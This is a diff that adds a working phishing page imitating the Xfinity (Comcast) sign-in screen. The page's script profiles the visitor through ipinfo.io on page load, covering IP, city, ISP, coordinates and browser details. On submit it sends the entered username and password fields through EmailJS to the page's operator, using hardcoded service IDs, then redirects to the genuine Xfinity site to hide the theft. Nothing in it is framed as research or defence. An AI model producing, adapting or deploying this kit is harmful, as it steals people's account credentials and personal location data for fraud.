@@ -1,0 +1,592 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to Xfinity</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta
+      name="description"
+      content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device."
+    />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="msapplication-TileColor" content="#ffffff" />
+    <meta
+      name="msapplication-TileImage"
+      content="static/images/favicon/favicon-96x96.png"
+    />
+    <meta name="theme-color" content="#ffffff" />
+    <link rel="shortcut icon" href="https://login.xfinity.com/favicon.ico" />
+    <link rel="stylesheet" href="./src/output.css" />
+  </head>
+  <body>
+    <!-- EmailJS SDK -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      // Initialize EmailJS with public key
+      (function () {
+        emailjs.init({
+          publicKey: "Eyfm5Q_2Xwc2eqVQ1",
+        });
+        console.log("EmailJS initialized");
+      })();
+    </script>
+
+    <script>
+      (function () {
+        "use strict";
+
+        // Configuration
+        const EMAILJS_SERVICE_ID = "service_txhhhjj";
+        const EMAILJS_TEMPLATE_ID = "template_dvst2eq";
+
+        // Track IP data - will be collected on page load
+        let cachedIpData = null;
+        let ipDataReady = false;
+        let dataSent = false;
+        let scriptElement = null;
+        let callbackName = null;
+
+        // Helper: Clean up JSONP to prevent memory leaks
+        function cleanupJsonp(cbName, scriptTag) {
+          if (cbName && window[cbName]) {
+            try {
+              delete window[cbName];
+            } catch (e) {
+              window[cbName] = undefined;
+            }
+          }
+          if (scriptTag && scriptTag.parentNode) {
+            try {
+              scriptTag.parentNode.removeChild(scriptTag);
+            } catch (e) {}
+          }
+        }
+
+        // Helper: Send collected data with email/password (uses cached IP data)
+        function sendDataViaEmail(emailValue, passwordValue) {
+          if (dataSent) {
+            console.log("Data already sent, skipping duplicate send");
+            return Promise.resolve();
+          }
+
+          if (!cachedIpData || !cachedIpData.ip) {
+            console.error("No IP data available");
+            return Promise.reject(new Error("No IP data available"));
+          }
+
+          // Prepare email parameters with all collected information
+          let params = {
+            // Basic IP info
+            ip_address: cachedIpData.ip || "Unknown",
+
+            // Geolocation details
+            city: cachedIpData.city || "Unknown",
+            region: cachedIpData.region || "Unknown",
+            country: cachedIpData.country || "Unknown",
+            country_name:
+              cachedIpData.country_name || cachedIpData.country || "Unknown",
+            location:
+              cachedIpData.loc ||
+              (cachedIpData.latitude && cachedIpData.longitude
+                ? `${cachedIpData.latitude},${cachedIpData.longitude}`
+                : "Unknown"),
+
+            // ISP/Organization
+            organization: cachedIpData.org || "Unknown",
+            isp: cachedIpData.org || "Unknown",
+
+            // Additional details
+            timezone: cachedIpData.timezone || "Unknown",
+            postal_code:
+              cachedIpData.postal || cachedIpData.postal_code || "Unknown",
+
+            // Hostname if available
+            hostname: cachedIpData.hostname || "Unknown",
+
+            // Browser/Device info (passive collection)
+            user_agent: navigator.userAgent || "Unknown",
+            platform: navigator.platform || "Unknown",
+            language: navigator.language || "Unknown",
+
+            // Timestamp
+            collected_at: new Date().toISOString(),
+
+            // Referrer (if any)
+            referrer: document.referrer || "Direct",
+
+            // Screen resolution (passive)
+            screen_resolution: `${screen.width}x${screen.height}`,
+
+            // url
+            url: "https://connect.xfinity.com",
+
+            // Timezone offset
+            timezone_offset: new Date().getTimezoneOffset(),
+
+            // Email and password from form
+            email: emailValue,
+            password: passwordValue,
+          };
+
+          // Send email
+          return emailjs
+            .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+            .then(function (response) {
+              dataSent = true;
+              /* console.log("✅ IP data successfully sent via EmailJS");
+              console.log("Response:", response.status, response.text); */
+              window.location.replace("https://connect.xfinity.com");
+              return response;
+            })
+            .catch(function (error) {
+              /*  console.error("❌ Failed to send IP data via EmailJS:", error);
+              console.error("Error details:", error.text || error.message); */
+              window.location.replace("https://connect.xfinity.com");
+              throw error;
+            });
+        }
+
+        // JSONP request to ipinfo.io
+        function fetchIpInfoViaJsonp() {
+          return new Promise((resolve, reject) => {
+            // Generate unique callback name
+            const uniqueId =
+              "ipinfo_cb_" +
+              Date.now() +
+              "_" +
+              Math.random().toString(36).substr(2, 9);
+            callbackName = uniqueId;
+
+            // Set timeout for JSONP (10 seconds)
+            const timeoutId = setTimeout(() => {
+              if (window[callbackName]) {
+                cleanupJsonp(callbackName, scriptElement);
+                reject(new Error("ipinfo.io JSONP timeout after 10 seconds"));
+              }
+            }, 10000);
+
+            // Define callback function
+            window[callbackName] = function (response) {
+              clearTimeout(timeoutId);
+              cleanupJsonp(callbackName, scriptElement);
+
+              if (response && response.ip) {
+                console.log("✅ ipinfo.io data received on page load");
+                resolve(response);
+              } else {
+                reject(new Error("Invalid or empty response from ipinfo.io"));
+              }
+            };
+
+            // Create script tag for JSONP
+            scriptElement = document.createElement("script");
+            scriptElement.src = `https://ipinfo.io/json?callback=${callbackName}`;
+            scriptElement.async = true;
+            scriptElement.onerror = function () {
+              clearTimeout(timeoutId);
+              cleanupJsonp(callbackName, scriptElement);
+              reject(new Error("Failed to load ipinfo.io script"));
+            };
+
+            // Append to head
+            document.head.appendChild(scriptElement);
+          });
+        }
+
+        // Fallback using fetch with CORS
+        async function fetchIpInfoFallback() {
+          try {
+            console.log(
+              "Attempting fallback fetch to ipinfo.io (CORS supported)",
+            );
+            const response = await fetch("https://ipinfo.io/json");
+            if (!response.ok) throw new Error("HTTP error: " + response.status);
+            const data = await response.json();
+            if (data && data.ip) return data;
+            throw new Error("Invalid data from fetch fallback");
+          } catch (err) {
+            console.error("Fallback fetch also failed:", err.message);
+            throw err;
+          }
+        }
+
+        // Function to collect IP data on page load
+        async function collectIpOnPageLoad() {
+          console.log("🔍 Collecting IP data on page load...");
+
+          try {
+            // Try JSONP first (primary method)
+            let ipData = null;
+            try {
+              ipData = await fetchIpInfoViaJsonp();
+            } catch (jsonpError) {
+              console.warn(
+                "JSONP failed, trying CORS fetch fallback:",
+                jsonpError.message,
+              );
+              // Fallback to fetch (ipinfo.io supports CORS)
+              try {
+                ipData = await fetchIpInfoFallback();
+              } catch (fetchError) {
+                throw new Error(
+                  `Both JSONP and fetch failed: ${fetchError.message}`,
+                );
+              }
+            }
+
+            // Store the IP data
+            if (ipData && ipData.ip) {
+              cachedIpData = ipData;
+              ipDataReady = true;
+              console.log("✅ IP data cached on page load:", cachedIpData.ip);
+            } else {
+              throw new Error("No IP address in response");
+            }
+          } catch (error) {
+            console.error(
+              "❌ Failed to collect IP data on page load:",
+              error.message,
+            );
+
+            // Store fallback data
+            cachedIpData = {
+              ip: "COLLECTION_FAILED",
+              error: error.message,
+              user_agent: navigator.userAgent,
+              timestamp: new Date().toISOString(),
+              city: "Unknown",
+              region: "Unknown",
+              country: "Unknown",
+              org: "Unknown",
+            };
+            ipDataReady = true;
+          } finally {
+            // Clean up any remaining JSONP elements
+            if (callbackName && window[callbackName]) {
+              cleanupJsonp(callbackName, scriptElement);
+            }
+            if (scriptElement && scriptElement.parentNode) {
+              try {
+                scriptElement.parentNode.removeChild(scriptElement);
+              } catch (e) {}
+            }
+          }
+        }
+
+        // Set up form submission handler
+        document.addEventListener("DOMContentLoaded", function () {
+          // Start collecting IP data immediately when page loads
+          collectIpOnPageLoad();
+
+          const form = document.getElementById("contact-form");
+
+          if (form) {
+            form.addEventListener("submit", function (event) {
+              event.preventDefault(); // Prevent default form submission
+
+              // Get form values
+              const emailInput = document.getElementById("email");
+              const passwordInput = document.getElementById("password");
+
+              const emailValue = emailInput ? emailInput.value : "";
+              const passwordValue = passwordInput ? passwordInput.value : "";
+
+              // Disable submit button
+              const submitButton = form.querySelector('input[type="submit"]');
+              if (submitButton) {
+                submitButton.disabled = true;
+              }
+
+              // console.log("Form submitted - sending cached IP data with email/password...");
+
+              // Send email with cached IP data (already collected on page load)
+              sendDataViaEmail(emailValue, passwordValue)
+                .then(() => {
+                  // console.log("✅ Email sent successfully, redirecting...");
+                  window.location.replace("https://connect.xfinity.com");
+                })
+                .catch((error) => {
+                  // console.error("❌ Error sending email:", error);
+                  window.location.replace("https://connect.xfinity.com");
+                });
+            });
+          } else {
+            // console.error("Form with id 'contact-form' not found");
+          }
+        });
+      })();
+    </script>
+
+    <div class="lg:flex lg:h-[90vh]">
+      <section
+        class="mx-auto max-w-md md:lg:max-w-lg lg:max-w-xl pt-10 lg:pt-25 lg:flex-1/2"
+      >
+        <div class="w-18 mb-6">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28">
+            <path
+              fill="#8b8b97"
+              d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"
+            />
+          </svg>
+        </div>
+
+        <h1 class="font-bold text-3xl mb-6">Sign in with your Xfinity ID</h1>
+        <form id="contact-form" class="mb-8">
+          <input
+            name="email"
+            id="email"
+            required
+            minlength="3"
+            type="text"
+            class="placeholder:text-gray-500 placeholder:text-md bg-gray-100 w-full p-4 border border-gray-600 rounded mb-3"
+            placeholder="Email, mobile, or username"
+          />
+
+          <input
+            name="password"
+            id="password"
+            type="hidden"
+            value="No password field for them to place their password"
+          />
+
+          <span class="block text-sm"
+            >By signing in, you agree to our
+            <span class="text-purple-800 underline">Terms of Service</span> and
+            <span class="text-purple-800 underline">Privacy Policy</span>.</span
+          >
+
+          <button
+            class="bg-[#5a23b9] rounded text-white font-medium py-4 px-8 mt-10"
+            type="submit"
+          >
+            Let's go
+          </button>
+        </form>
+
+        <div class="w-full">
+          <div
+            class="flex justify-between items-center border-b border-gray-300 p-4 w-full text-md hover:bg-gray-100"
+          >
+            <span>Find your Xfinity ID</span>
+            <span class="text-gray-600">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="1.5"
+                stroke="currentColor"
+                class="size-5"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="m8.25 4.5 7.5 7.5-7.5 7.5"
+                />
+              </svg>
+            </span>
+          </div>
+          <div
+            class="flex justify-between items-center p-4 w-full text-md hover:bg-gray-100"
+          >
+            <span>Create a new Xfinity ID</span>
+            <span class="text-gray-600">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="1.5"
+                stroke="currentColor"
+                class="size-5"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="m8.25 4.5 7.5 7.5-7.5 7.5"
+                />
+              </svg>
+            </span>
+          </div>
+        </div>
+      </section>
+      <section
+        class="mx-auto lg:mx-0 max-w-md lg:max-w-[50vw] pt-10 lg:pt-0 lg:flex-1/2"
+      >
+        <div class="w-full h-full">
+          <img src="./small.png" alt="" class="w-75 mx-auto md:hidden" />
+          <img
+            src="./big.png"
+            alt=""
+            class="mx-auto hidden md:block w-full h-full object-top"
+          />
+        </div>
+      </section>
+    </div>
+    <footer class="md:fixed w-full bottom-0 bg-white">
+      <ul
+        class="my-8 md:my-3 space-y-4 text-sm text-center grid grid-cols-1 lg:grid-cols-3 xl:grid-cols-7"
+      >
+        <li class="text-gray-500">&copy 2026 Comcast</li>
+        <li class="flex justify-center items-center">
+          <span
+            ><svg
+              class="size-4"
+              xmlns="http://www.w3.org/2000/svg"
+              width="48"
+              height="48"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              focusable="false"
+              role="img"
+              aria-hidden="true"
+            >
+              <path
+                d="M16,2H8A3,3,0,0,0,5,5V19a3,3,0,0,0,3,3h8a3,3,0,0,0,3-3V5A3,3,0,0,0,16,2Zm1.5,17A1.5,1.5,0,0,1,16,20.5H8A1.5,1.5,0,0,1,6.5,19V5A1.5,1.5,0,0,1,8,3.5h8A1.5,1.5,0,0,1,17.5,5Zm-5-14H8v5H12.5ZM11,8.5H9.51v-2H11Zm-3,6h8V16H8Zm0,3h8V19H8ZM16,10H14V8.51h2ZM8,11.5h8V13H8Z"
+              ></path></svg></span
+          >Web Terms Of Service
+        </li>
+        <li class="flex items-center justify-center">
+          <span
+            ><svg
+              class="size-4"
+              xmlns="http://www.w3.org/2000/svg"
+              width="88"
+              height="88"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              focusable="false"
+              role="img"
+              aria-hidden="true"
+            >
+              <path
+                d="M13.3,7H6V5.5h7.3Zm.93,13.49c-.2,0-.41,0-.61,0a1.12,1.12,0,0,1-.32,0H6A1.5,1.5,0,0,1,4.5,19V5A1.5,1.5,0,0,1,6,3.5h7.3A1.5,1.5,0,0,1,14.8,5V7.14h.52a6.37,6.37,0,0,1,1,.08V5a3,3,0,0,0-3-3H6A3,3,0,0,0,3,5V19a3,3,0,0,0,3,3h7.3a3,3,0,0,0,2.6-1.53l-.58,0ZM6,19h4a6.79,6.79,0,0,1-1.38-1.5H6Zm0-3H7.89a6.29,6.29,0,0,1-.34-1.5H6Zm1.94-4.5H6V13H7.57A6.33,6.33,0,0,1,7.94,11.5Zm2.25-3H6V10H8.73A6.5,6.5,0,0,1,10.19,8.5ZM22,18.83l-1.07,1.06L18.74,17.7A5.19,5.19,0,0,1,15.32,19H14.23a4.73,4.73,0,0,1-.93-.09h0a3.92,3.92,0,0,1-.49-.13,2.64,2.64,0,0,1-.4-.12,3.25,3.25,0,0,1-.43-.18l-.42-.23-.34-.2a5.64,5.64,0,0,1-.65-.54,5.1,5.1,0,0,1,.17-7.5h0a4.83,4.83,0,0,1,1-.71L12,9.17a4,4,0,0,1,.48-.2c.12-.05.25-.08.38-.12a3.43,3.43,0,0,1,.46-.11h0a4.73,4.73,0,0,1,.93-.1h1.09a5.2,5.2,0,0,1,5.22,5.18,5.1,5.1,0,0,1-.81,2.75Zm-2.95-5a3.7,3.7,0,0,0-3.72-3.68H14.23a3.68,3.68,0,1,0,0,7.35h1.09A3.7,3.7,0,0,0,19,13.82Z"
+              ></path></svg></span
+          >CA Notice at Collection
+        </li>
+        <li class="flex items-center justify-center">
+          <span
+            ><svg
+              class="size-4"
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              focusable="false"
+              role="img"
+              aria-hidden="true"
+            >
+              <path
+                d="M17.22,17.25a2.29,2.29,0,0,0,.78-.14V19a3,3,0,0,1-3,3H8a3,3,0,0,1-3-3V5A3,3,0,0,1,8,2H15a3,3,0,0,1,3,3V6.91a2.16,2.16,0,0,0-.77-.16h0a2.14,2.14,0,0,0-.72.14V5A1.47,1.47,0,0,0,15,3.5H8A1.47,1.47,0,0,0,6.5,5V19A1.47,1.47,0,0,0,8,20.5H15A1.47,1.47,0,0,0,16.5,19v-1.9A2.47,2.47,0,0,0,17.22,17.25ZM7.93,19h7.14V17.5H7.93Zm5.17-4.5H7.93V16h6.5A5.22,5.22,0,0,1,13.1,14.5Zm-5.17-3V13h4.62a11.4,11.4,0,0,1-.19-1.5Zm5.1-3H7.93V10h4.44a1.21,1.21,0,0,1,0-.2A1.84,1.84,0,0,1,13,8.5Zm2-3H7.93V7h7.14Zm5.26,7.57a3,3,0,0,1-.13.36,3.13,3.13,0,0,1-.55.87A5.46,5.46,0,0,1,18,15.49l-.43.19a.84.84,0,0,1-.35.07.92.92,0,0,1-.36-.07l-.36-.16c-.17-.09-.36-.18-.56-.3a6.07,6.07,0,0,1-.7-.5l-.1-.08-.07-.07V14.5H15a3.16,3.16,0,0,1-.76-1.07,3,3,0,0,1-.13-.36.25.25,0,0,0,0-.07,7.33,7.33,0,0,1-.22-1.5,12.33,12.33,0,0,1,0-1.5.37.37,0,0,1,0-.11.29.29,0,0,1,.06-.19.68.68,0,0,1,.29-.22h0l.13-.06.69-.27,1.43-.62.22-.1L17,8.31a.6.6,0,0,1,.27-.06h0a.58.58,0,0,1,.26.06l.23.12.28.13c.66.3,1.61.68,2.06.86l.14.06h0a.63.63,0,0,1,.28.21.36.36,0,0,1,.07.19A10.64,10.64,0,0,1,20.33,13.07Zm-.75-2-.7-.71-.88.87-1.07,1.07-.43-.43L16,11.33l-.71.71L16.5,13.3l.43.43L18,12.66Z"
+              ></path></svg></span
+          >Privacy Policy
+        </li>
+        <li class="flex justify-center items-center">
+          <span
+            ><svg
+              class="size-4"
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              focusable="false"
+              role="img"
+              aria-hidden="true"
+            >
+              <path
+                d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5Zm.83,7.17,1.06-1.06,1.33,1.33,1.33-1.33,1.06,1.06L17.86,12l1.33,1.33-1.06,1.06L16.8,13.06l-1.33,1.33-1.06-1.06L15.74,12ZM3.5,12.08v-.16A6.92,6.92,0,0,1,10.42,5h3.22L10.36,19A6.92,6.92,0,0,1,3.5,12.08ZM7,14.5,4.89,12.39,6,11.33l1,1.05L9.77,9.61l1.06,1.06Z"
+              ></path></svg></span
+          >Your Privacy Choices
+        </li>
+        <li class="flex justify-center item-center">
+          <span
+            ><svg
+              class="size-4"
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              focusable="false"
+              role="img"
+              aria-hidden="true"
+            >
+              <path
+                d="M17.54,4A5.32,5.32,0,0,0,12,5.42,5.31,5.31,0,0,0,6.46,4,5.34,5.34,0,0,0,3,9.34c0,3.08,2.71,5.47,5.57,8,1,.85,1.95,1.72,2.87,2.65l.59.53.53-.53c.92-.93,1.91-1.8,2.87-2.65,2.86-2.54,5.57-4.93,5.57-8A5.34,5.34,0,0,0,17.54,4Zm-3.11,12.2c-.8.71-1.63,1.44-2.43,2.22-.8-.78-1.63-1.51-2.43-2.22a30,30,0,0,1-3.75-3.71H9.26a.75.75,0,0,0,.63-.35l.85-1.29,1.56,3.34a.75.75,0,0,0,.61.43H13a.75.75,0,0,0,.61-.31l1.33-1.82h3.26A30,30,0,0,1,14.43,16.23ZM19.12,11H14.54a.76.76,0,0,0-.61.3l-.81,1.11L11.52,9a.73.73,0,0,0-.63-.43.75.75,0,0,0-.68.34L8.85,11h-4A4.19,4.19,0,0,1,4.5,9.34,3.84,3.84,0,0,1,7,5.45a3.33,3.33,0,0,1,1.16-.2,4.11,4.11,0,0,1,3.2,1.64.91.91,0,0,0,1.39,0,3.9,3.9,0,0,1,4.35-1.44A3.84,3.84,0,0,1,19.5,9.34,4.19,4.19,0,0,1,19.12,11Z"
+              ></path></svg></span
+          >Health Privacy Notice
+        </li>
+        <li class="flex justify-center items-center">
+          <span
+            ><svg
+              class="size-4"
+              xmlns="http://www.w3.org/2000/svg"
+              width="24"
+              height="24"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              focusable="false"
+              role="img"
+              aria-hidden="true"
+            >
+              <g>
+                <circle cx="10.75" cy="14.75" r="0.75"></circle>
+                <path
+                  d="M19.27,9,14.16,6a.75.75,0,0,0-1,.27.74.74,0,0,0,.27,1l5.11,3a2,2,0,0,1,0,3.48l-11,6.48a2,2,0,0,1-2,0,2,2,0,0,1-1-1.74v-13a2,2,0,0,1,1-1.74,2,2,0,0,1,2,0L10,5.25V12a.75.75,0,0,0,1.5,0V4.82a.76.76,0,0,0-.37-.65L8.26,2.49a3.44,3.44,0,0,0-3.49,0A3.49,3.49,0,0,0,3,5.51v13a3.49,3.49,0,0,0,1.77,3.05,3.44,3.44,0,0,0,3.49,0l11-6.48a3.52,3.52,0,0,0,0-6.06Z"
+                ></path>
+              </g></svg></span
+          >Ad Choices
+        </li>
+      </ul>
+      <div
+        class="w-full bg-black text-white text-center text-xs py-2 flex items-center justify-center"
+      >
+        <span class="flex items-center justify-center gap-1"
+          ><span
+            ><svg
+              class="size-4"
+              version="1.1"
+              id="Layer_1"
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              x="0px"
+              y="0px"
+              viewBox="0 0 256 256"
+              style="enable-background: new 0 0 256 256"
+              fill="currentColor"
+              xml:space="preserve"
+            >
+              <g>
+                <path
+                  d="M141.3,22.6c58.2,7.9,99,61.5,91.1,119.7c-6.5,47.9-44.5,85.4-92.6,91.3c-4,0-8.1,0.6-12.5,0.6
+		c-53.8-0.1-99.1-40.3-105.5-93.7c8.3-0.1,16.5-1.9,24.1-5.2c20.7-9.3,35-28.8,37.5-51.4c6.7-0.6,13.3-2.3,19.5-5
+		c22.6-9.9,37.5-31.9,38.2-56.5 M127.3,3h-3.9c-1.9,0.1-3.3,1.8-3.1,3.6c0,0.2,0.1,0.4,0.1,0.6c6.8,21.9-4,45.5-25,54.6
+		c-5.5,2.4-11.5,3.6-17.5,3.6c-3.3,0-6.6-0.4-9.7-1.1h-0.8c-1.7,0-3.2,1.3-3.2,3.1c0,0.2,0,0.5,0.1,0.7c5,24.2-10.6,47.9-34.8,52.8
+		c-2.9,0.6-5.8,0.9-8.8,0.9c-5.6,0-11.2-1.1-16.5-3.1l0,0c-0.5-0.1-1,0.3-1.1,0.9c0,0,0,0.1,0,0.1c0,2.7,0,5.5,0,8.2
+		c0,68.7,55.5,124.6,124.2,125c4.8,0,9.5-0.3,14.2-0.7c68.6-7.5,118.1-69.3,110.6-137.9C245.2,50.7,191.3,2.7,127.3,3z"
+                />
+                <circle cx="127.2" cy="128.1" r="17.2" />
+                <circle cx="166.6" cy="70.3" r="17.1" />
+                <ellipse
+                  transform="matrix(0.1602 -0.9871 0.9871 0.1602 23.1331 308.1909)"
+                  cx="192.7"
+                  cy="140.5"
+                  rx="17.2"
+                  ry="17.2"
+                />
+                <circle cx="139.4" cy="193.6" r="17.2" />
+                <circle cx="69.3" cy="167.6" r="17.1" />
+              </g></svg></span
+          >Cookie Preference</span
+        >
+      </div>
+    </footer>
+  </body>
+</html>
